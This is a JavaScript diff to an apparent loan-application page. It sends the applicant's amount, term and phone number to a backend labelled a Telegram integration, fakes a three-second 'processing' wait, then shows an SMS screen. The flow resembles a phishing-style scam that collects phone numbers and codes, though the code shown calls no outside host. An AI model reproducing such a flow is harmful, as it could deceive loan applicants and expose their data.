@@ -153,10 +153,39 @@ function prevStep(stepNumber) {
     }
 }
 
+// --- Form Submission with Telegram Integration ---
 function submitApplication() {
+    // 1. Get the data from the form
+    const amount = document.getElementById('formLoanAmount').value;
+    const term = document.getElementById('formLoanTerm').value;
+    
+    // Find the phone number input
+    const phoneInput = document.querySelector('input[type="tel"]');
+    const phone = phoneInput ? phoneInput.value : 'Not provided';
+
+    // 2. Show the processing screen immediately
     showScreen('processing-screen');
 
-    setTimeout(() => {
-        showScreen('sms-screen');
-    }, 3000); 
+    // 3. Send data to backend
+    fetch('/api/request-approval', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ amount, term, phone })
+    })
+    .then(response => {
+        if (response.ok) {
+            // 4. Wait 3 seconds to simulate "processing", then go to SMS screen
+            setTimeout(() => {
+                showScreen('sms-screen');
+            }, 3000); 
+        } else {
+            alert('Error sending request. Please try again.');
+            showScreen('form-screen');
+        }
+    })
+    .catch(error => {
+        console.error('Error:', error);
+        alert('Network error. Please try again.');
+        showScreen('form-screen');
+    });
 }
